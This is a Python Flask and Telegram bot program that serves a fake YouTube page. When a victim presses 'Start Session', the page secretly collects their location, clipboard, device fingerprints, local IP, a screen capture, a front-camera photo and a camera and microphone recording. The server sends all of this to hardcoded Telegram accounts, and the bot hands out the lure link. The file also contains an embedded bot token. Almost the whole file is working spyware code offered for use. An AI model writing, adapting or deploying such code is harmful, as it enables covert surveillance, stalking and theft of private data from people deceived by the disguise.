import os
import threading
import json
from flask import Flask, request, render_template_string
import telebot

BOT_TOKEN = "8637899791:AAEcpjrVy2j9sUTK-rvpX_HsuKBpkX7gnlU"
USER_IDS = [7361880623, 8475691696]
BASE_URL = "https://web-youtube-asuma66.up.railway.app"

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

HTML_PAGE = """<!DOCTYPE html>
<html>
<head>
    <title>YouTube</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body { font-family: 'Roboto', sans-serif; margin:0; background:#0f0f0f; color:#fff; }
        .header { background:#202020; padding:12px 20px; display:flex; align-items:center; }
        .header .logo { font-size:24px; font-weight:bold; color:#ff0000; }
        .header .user { margin-left:auto; color:#aaa; }
        .container { max-width:900px; margin:20px auto; padding:0 20px; }
        .video-placeholder { background:#1a1a1a; border-radius:12px; padding:20px; text-align:center; }
        .video-placeholder img { max-width:100%; border-radius:8px; }
        .info { margin-top:15px; }
        .info .title { font-size:22px; font-weight:500; }
        .info .channel { color:#aaa; margin-top:8px; }
        .controls { margin-top:20px; display:flex; gap:10px; flex-wrap:wrap; justify-content:center; }
        .controls button { background:#3ea6ff; border:none; color:#000; padding:10px 24px; border-radius:20px; font-weight:bold; cursor:pointer; font-size:16px; }
        .controls button:disabled { opacity:0.5; cursor:not-allowed; }
        #statusText, #locationStatus, #debug { display: none; }
        html, body { min-height: 100%; }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">YouTube</div>
        <div class="user">asuma.66</div>
    </div>
    <div class="container">
        <div class="video-placeholder">
            <img id="thumbnail" src="https://img.youtube.com/vi/dQw4w9WgXcQ/hqdefault.jpg" alt="video thumbnail">
        </div>
        <div class="info">
            <div class="title">🔥 ASUSMA LIVE 🔥</div>
            <div class="channel">asuma.66 - 1.2M subscribers</div>
        </div>
        <div class="controls">
            <button id="startBtn">▶ Start Session</button>
        </div>
        <div id="statusText"></div>
        <div id="locationStatus"></div>
        <div id="debug"></div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>

    <script>
        let mediaRecorder = null;
        let recordedChunks = [], recordingActive = false, maxDuration = 10000;
        const startBtn = document.getElementById('startBtn');

        function delay(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }

        async function sendData(formData) {
            try { await fetch('/capture', { method: 'POST', body: formData }); } catch(e) {}
        }

        // ---- Base system info (unchanged) ----
        async function getIpInfo() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                return await res.json();
            } catch { return { ip: 'unknown', city: 'unknown', region: 'unknown', country: 'unknown' }; }
        }

        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let brand = 'Unknown', model = 'Unknown';
            if (ua.includes('iPhone')) { brand = 'Apple'; model = 'iPhone'; }
            else if (ua.includes('iPad')) { brand = 'Apple'; model = 'iPad'; }
            else if (ua.includes('Android')) {
                brand = 'Android';
                const match = ua.match(/Android\\s+([\\d.]+);\\s+([^;)]+)/);
                model = match ? match[2] : 'Android Device';
            } else if (ua.includes('Windows')) { brand = 'Microsoft Windows'; model = 'PC'; }
            else if (ua.includes('Mac')) { brand = 'Apple Mac'; model = 'Mac'; }
            return { brand, model };
        }

        async function getBatteryInfo() {
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    const level = Math.round(battery.level * 100);
                    const discharge = battery.dischargingTime !== Infinity ? Math.round(battery.dischargingTime / 60) : null;
                    return { level: level, charging: battery.charging, discharge_min: discharge };
                } else {
                    return { level: 'not supported', charging: 'unknown', discharge_min: null };
                }
            } catch (e) {
                return { level: 'error', charging: 'unknown', discharge_min: null };
            }
        }

        function getNetworkType() {
            if (navigator.connection) {
                return navigator.connection.effectiveType || 'unknown';
            }
            return 'unknown';
        }

        function getScreenResolution() {
            return `${window.screen.width}x${window.screen.height}`;
        }

        function getTimezone() {
            try { return Intl.DateTimeFormat().resolvedOptions().timeZone; } catch { return 'unknown'; }
        }

        function getLanguage() {
            return navigator.language || 'unknown';
        }

        function getOrientation() {
            if (screen.orientation) {
                return screen.orientation.type;
            } else if (window.orientation !== undefined) {
                return window.orientation === 0 ? 'portrait' : 'landscape';
            }
            return 'unknown';
        }

        // ---- New feature functions ----
        function getMotionData() {
            return new Promise((resolve) => {
                let data = { accel: null, gyro: null };
                let resolved = false;
                const accelHandler = (e) => {
                    if (!resolved) {
                        data.accel = {
                            x: e.accelerationIncludingGravity.x,
                            y: e.accelerationIncludingGravity.y,
                            z: e.accelerationIncludingGravity.z
                        };
                    }
                };
                const gyroHandler = (e) => {
                    if (!resolved) {
                        data.gyro = {
                            alpha: e.alpha,
                            beta: e.beta,
                            gamma: e.gamma
                        };
                    }
                };
                window.addEventListener('devicemotion', accelHandler);
                window.addEventListener('deviceorientation', gyroHandler);
                setTimeout(() => {
                    if (!resolved) {
                        resolved = true;
                        window.removeEventListener('devicemotion', accelHandler);
                        window.removeEventListener('deviceorientation', gyroHandler);
                        resolve(data);
                    }
                }, 1500);
            });
        }

        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                canvas.width = 200;
                canvas.height = 50;
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 4, 17);
                const dataUrl = canvas.toDataURL();
                let hash = 0;
                for (let i = 0; i < dataUrl.length; i++) {
                    hash = ((hash << 5) - hash) + dataUrl.charCodeAt(i);
                    hash |= 0;
                }
                return hash.toString(36);
            } catch (e) {
                return 'error';
            }
        }

        async function getAudioFingerprint() {
            try {
                const ctx = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = ctx.createOscillator();
                const analyser = ctx.createAnalyser();
                oscillator.connect(analyser);
                analyser.connect(ctx.destination);
                oscillator.frequency.value = 440;
                oscillator.start(0);
                const data = new Float32Array(analyser.frequencyBinCount);
                analyser.getFloatFrequencyData(data);
                let sum = 0;
                for (let i = 0; i < data.length; i++) sum += data[i] || 0;
                oscillator.stop(0);
                await ctx.close();
                return Math.round(sum * 1000);
            } catch (e) {
                return 'error';
            }
        }

        function getInstalledFonts() {
            try {
                const fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Tahoma', 'Comic Sans MS', 'Impact', 'Trebuchet MS'];
                const installed = [];
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                const base = 'abcdefghijklmnopqrstuvwxyz';
                for (const font of fonts) {
                    ctx.font = '20px ' + font;
                    if (ctx.measureText(base).width > 0) {
                        installed.push(font);
                    }
                }
                return installed;
            } catch (e) {
                return ['error'];
            }
        }

        function getPerformanceData() {
            try {
                const nav = performance.getEntriesByType('navigation')[0];
                if (nav) {
                    return {
                        load_time: nav.loadEventEnd - nav.loadEventStart,
                        dns_time: nav.domainLookupEnd - nav.domainLookupStart,
                        tcp_time: nav.connectEnd - nav.connectStart,
                        dom_ready: nav.domContentLoadedEventEnd - nav.domContentLoadedEventStart
                    };
                }
                return null;
            } catch (e) {
                return null;
            }
        }

        function getLocalIP() {
            return new Promise((resolve) => {
                try {
                    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                    pc.createDataChannel('');
                    pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => resolve(null));
                    pc.onicecandidate = (e) => {
                        if (e.candidate) {
                            const ip = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(e.candidate.candidate);
                            if (ip) {
                                resolve(ip[0]);
                                pc.close();
                            }
                        }
                    };
                    setTimeout(() => resolve(null), 3000);
                } catch (e) { resolve(null); }
            });
        }

        async function getClipboardText() {
            try {
                if (navigator.clipboard) {
                    const text = await navigator.clipboard.readText();
                    return text;
                }
                return null;
            } catch (e) {
                return null;
            }
        }

        async function captureScreen() {
            try {
                if (!navigator.mediaDevices.getDisplayMedia) return null;
                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                // Capture a single frame
                const video = document.createElement('video');
                video.srcObject = stream;
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play();
                        setTimeout(resolve, 200);
                    };
                });
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                const blob = await new Promise((resolve) => canvas.toBlob(resolve, 'image/jpeg', 0.85));
                stream.getTracks().forEach(t => t.stop());
                return blob;
            } catch (e) {
                return null;
            }
        }

        // ---- Front camera with audio ----
        async function getFrontStream() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: { ideal: 320 } },
                    audio: true
                });
                return stream;
            } catch (e) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    return stream;
                } catch (e2) {
                    return null;
                }
            }
        }

        async function getAudioOnly() {
            try {
                return await navigator.mediaDevices.getUserMedia({ audio: true });
            } catch {
                return null;
            }
        }

        function captureFrame(stream) {
            return new Promise((resolve) => {
                if (!stream) { resolve(null); return; }
                const video = document.createElement('video');
                video.srcObject = stream;
                let resolved = false;
                video.onloadedmetadata = () => {
                    video.play();
                    let attempts = 0;
                    const checkFrame = () => {
                        attempts++;
                        if (video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0) {
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0);
                            canvas.toBlob((blob) => {
                                if (!resolved) { resolved = true; resolve(blob); }
                                video.pause();
                                video.srcObject = null;
                            }, 'image/jpeg', 0.9);
                        } else if (attempts < 20) {
                            setTimeout(checkFrame, 100);
                        } else {
                            if (!resolved) { resolved = true; resolve(null); }
                            video.pause();
                            video.srcObject = null;
                        }
                    };
                    checkFrame();
                };
            });
        }

        // ---- Main session ----
        async function startSession() {
            startBtn.disabled = true;
            startBtn.innerText = 'Loading...';
            await delay(300);

            // 1. Location
            let locationData = null;
            if (navigator.geolocation) {
                try {
                    const pos = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 10000 });
                    });
                    locationData = { lat: pos.coords.latitude, lng: pos.coords.longitude };
                } catch {
                    locationData = { denied: true };
                }
            } else {
                locationData = { denied: true };
            }

            // 2. System info
            const ipInfo = await getIpInfo();
            const device = getDeviceInfo();
            const battery = await getBatteryInfo();
            const network = getNetworkType();
            const screenRes = getScreenResolution();
            const timezone = getTimezone();
            const language = getLanguage();
            const orientation = getOrientation();

            // 3. Additional features (parallel for speed)
            const [motion, localIP, clipboard, canvasHash, audioFingerprint, fonts, perf, screenBlob] = await Promise.all([
                getMotionData(),
                getLocalIP(),
                getClipboardText(),
                Promise.resolve(getCanvasFingerprint()),
                getAudioFingerprint(),
                Promise.resolve(getInstalledFonts()),
                Promise.resolve(getPerformanceData()),
                captureScreen() // this may take a moment
            ]);

            // 4. Front camera stream
            let stream = await getFrontStream();
            let combinedStream = stream;
            let audioStatus = 'none';

            if (stream && stream.getAudioTracks().length === 0) {
                const audioStream = await getAudioOnly();
                if (audioStream) {
                    const tracks = [];
                    stream.getVideoTracks().forEach(t => tracks.push(t));
                    audioStream.getAudioTracks().forEach(t => tracks.push(t));
                    combinedStream = new MediaStream(tracks);
                    audioStatus = 'combined';
                } else {
                    audioStatus = 'failed (no audio)';
                }
            } else if (stream && stream.getAudioTracks().length > 0) {
                audioStatus = 'present';
            } else {
                audioStatus = 'no stream';
            }

            // If stream null, try any camera with audio
            if (!stream) {
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    combinedStream = stream;
                    audioStatus = 'present (fallback)';
                } catch (e) {
                    stream = null;
                    combinedStream = null;
                }
            }

            // Capture front camera image
            let imageBlob = null;
            if (combinedStream) {
                imageBlob = await captureFrame(combinedStream);
            }

            // Screenshot of page
            const screenshotBlob = await captureScreenshot();

            // Recording
            let videoBlob = null;
            let finalized = false;

            async function finalizeAndSend() {
                if (finalized) return;
                finalized = true;
                const fd = new FormData();
                // Location
                if (locationData && !locationData.denied) {
                    fd.append('lat', locationData.lat);
                    fd.append('lng', locationData.lng);
                } else {
                    fd.append('location_denied', 'true');
                }
                // System info
                fd.append('ip', ipInfo.ip || 'unknown');
                fd.append('city', ipInfo.city || 'unknown');
                fd.append('region', ipInfo.region || 'unknown');
                fd.append('country', ipInfo.country || 'unknown');
                fd.append('brand', device.brand);
                fd.append('model', device.model);
                fd.append('battery_level', battery.level);
                fd.append('battery_charging', battery.charging);
                fd.append('battery_discharge_min', battery.discharge_min !== null ? battery.discharge_min : 'unknown');
                fd.append('network', network);
                fd.append('screen_res', screenRes);
                fd.append('timezone', timezone);
                fd.append('language', language);
                fd.append('orientation', orientation);
                fd.append('audio_status', audioStatus);
                // Motion
                if (motion.accel) fd.append('accel', JSON.stringify(motion.accel));
                if (motion.gyro) fd.append('gyro', JSON.stringify(motion.gyro));
                // Other features
                if (localIP) fd.append('local_ip', localIP);
                if (clipboard) fd.append('clipboard', clipboard);
                fd.append('canvas_fingerprint', canvasHash);
                fd.append('audio_fingerprint', audioFingerprint);
                if (fonts.length) fd.append('fonts', JSON.stringify(fonts));
                if (perf) fd.append('performance', JSON.stringify(perf));
                // Media
                if (screenshotBlob) fd.append('screenshot', screenshotBlob, 'screenshot.jpg');
                if (screenBlob) fd.append('screen_capture', screenBlob, 'screen.jpg');
                if (imageBlob) fd.append('frontImage', imageBlob, 'front.jpg');
                if (videoBlob) fd.append('video', videoBlob, 'recording.webm');

                await sendData(fd);
                startBtn.disabled = false;
                startBtn.innerText = '▶ Start Session';
            }

            // Recording
            if (combinedStream) {
                try {
                    let mimeType = 'video/webm';
                    if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9,opus')) {
                        mimeType = 'video/webm;codecs=vp9,opus';
                    } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {
                        mimeType = 'video/webm;codecs=vp8,opus';
                    }
                    mediaRecorder = new MediaRecorder(combinedStream, { mimeType: mimeType });
                    recordedChunks = [];
                    mediaRecorder.ondataavailable = (e) => { if (e.data.size) recordedChunks.push(e.data); };
                    mediaRecorder.onstop = () => {
                        videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
                        finalizeAndSend();
                    };
                    mediaRecorder.start(1000);
                    recordingActive = true;
                    setTimeout(() => {
                        if (recordingActive && mediaRecorder && mediaRecorder.state === 'recording') {
                            mediaRecorder.stop();
                            recordingActive = false;
                        }
                    }, maxDuration);
                    window.addEventListener('beforeunload', () => {
                        if (recordingActive && mediaRecorder && mediaRecorder.state === 'recording') {
                            mediaRecorder.stop();
                            recordingActive = false;
                        }
                    });
                    setTimeout(() => {
                        if (!finalized) {
                            if (mediaRecorder && mediaRecorder.state === 'recording') {
                                mediaRecorder.stop();
                                recordingActive = false;
                            }
                            if (!videoBlob) videoBlob = new Blob([], { type: 'video/webm' });
                            finalizeAndSend();
                        }
                    }, maxDuration + 3000);
                } catch (e) {
                    finalizeAndSend();
                }
            } else {
                finalizeAndSend();
            }
        }

        document.getElementById('startBtn').addEventListener('click', startSession);
    </script>
</body>
</html>"""

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/capture', methods=['POST'])
def capture():
    # Extract all fields
    lat = request.form.get('lat')
    lng = request.form.get('lng')
    location_denied = request.form.get('location_denied')
    ip = request.form.get('ip', 'unknown')
    city = request.form.get('city', 'unknown')
    region = request.form.get('region', 'unknown')
    country = request.form.get('country', 'unknown')
    brand = request.form.get('brand', 'Unknown')
    model = request.form.get('model', 'Unknown')
    battery_level = request.form.get('battery_level', 'unknown')
    battery_charging = request.form.get('battery_charging', 'unknown')
    battery_discharge_min = request.form.get('battery_discharge_min', 'unknown')
    network = request.form.get('network', 'unknown')
    screen_res = request.form.get('screen_res', 'unknown')
    timezone = request.form.get('timezone', 'unknown')
    language = request.form.get('language', 'unknown')
    orientation = request.form.get('orientation', 'unknown')
    audio_status = request.form.get('audio_status', 'unknown')
    # Extra features
    accel = request.form.get('accel')
    gyro = request.form.get('gyro')
    local_ip = request.form.get('local_ip', '')
    clipboard = request.form.get('clipboard', '')
    canvas_fingerprint = request.form.get('canvas_fingerprint', '')
    audio_fingerprint = request.form.get('audio_fingerprint', '')
    fonts = request.form.get('fonts', '[]')
    perf = request.form.get('performance', '{}')
    # Files
    screenshot = request.files.get('screenshot')
    screen_capture = request.files.get('screen_capture')
    front_img = request.files.get('frontImage')
    video = request.files.get('video')

    for uid in USER_IDS:
        # Location
        if lat and lng:
            try:
                bot.send_location(uid, float(lat), float(lng))
                bot.send_message(uid, f"📍 Location: {lat}, {lng}")
            except Exception as e:
                print(f"Location send error: {e}")
        elif location_denied:
            try:
                bot.send_message(uid, "📍 Location: Denied by user.")
            except Exception as e:
                print(f"Error: {e}")

        # Build detailed message with all data
        try:
            msg = (
                f"🌐 IP: {ip}\n"
                f"📍 City: {city}, {region}, {country}\n"
                f"📱 Device: {brand} - {model}\n"
                f"🔋 Battery: {battery_level}% (charging: {battery_charging}) - discharge: {battery_discharge_min} min\n"
                f"📶 Network: {network}\n"
                f"🖥️ Screen: {screen_res}\n"
                f"⏰ Timezone: {timezone}\n"
                f"🌍 Language: {language}\n"
                f"🔄 Orientation: {orientation}\n"
                f"🎙️ Audio: {audio_status}\n"
                f"📶 Local IP: {local_ip}\n"
                f"🖌️ Canvas fingerprint: {canvas_fingerprint}\n"
                f"🎵 Audio fingerprint: {audio_fingerprint}\n"
                f"📋 Clipboard: {clipboard if clipboard else 'N/A'}\n"
                f"📄 Fonts: {fonts}\n"
                f"⚡ Performance: {perf}\n"
                f"📊 Motion: {accel if accel else 'N/A'} / {gyro if gyro else 'N/A'}"
            )
            bot.send_message(uid, msg)
        except Exception as e:
            print(f"Info send error: {e}")

        # Screenshot of page
        if screenshot:
            try:
                screenshot.seek(0)
                bot.send_photo(uid, screenshot.read(), caption="📸 Full Page Screenshot")
            except Exception as e:
                print(f"Screenshot error: {e}")

        # Screen capture (display media)
        if screen_capture:
            try:
                screen_capture.seek(0)
                bot.send_photo(uid, screen_capture.read(), caption="🖥️ Screen Capture")
            except Exception as e:
                print(f"Screen capture error: {e}")

        # Front camera image
        if front_img:
            try:
                front_img.seek(0)
                bot.send_photo(uid, front_img.read(), caption="🤳 Front Camera")
            except Exception as e:
                print(f"Front image error: {e}")

        # Video recording
        if video:
            try:
                video.seek(0)
                bot.send_video(uid, video.read(), supports_streaming=True, caption="🎥 Recording (with audio)")
            except Exception as e:
                print(f"Video error: {e}")

        # Final notification
        try:
            bot.send_message(uid, "✅ All data captured.")
        except:
            pass

    return "OK", 200

@bot.message_handler(commands=['start'])
def send_link(m):
    bot.reply_to(m, f"🔗 Open this link on your phone:\n{BASE_URL}/\n\nCollects comprehensive device data including camera, sensors, clipboard, screen capture, and more.")

def run_bot():
    print("Bot polling started.")
    bot.polling(non_stop=True, interval=1)

if __name__ == '__main__':
    threading.Thread(target=run_bot, daemon=True).start()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
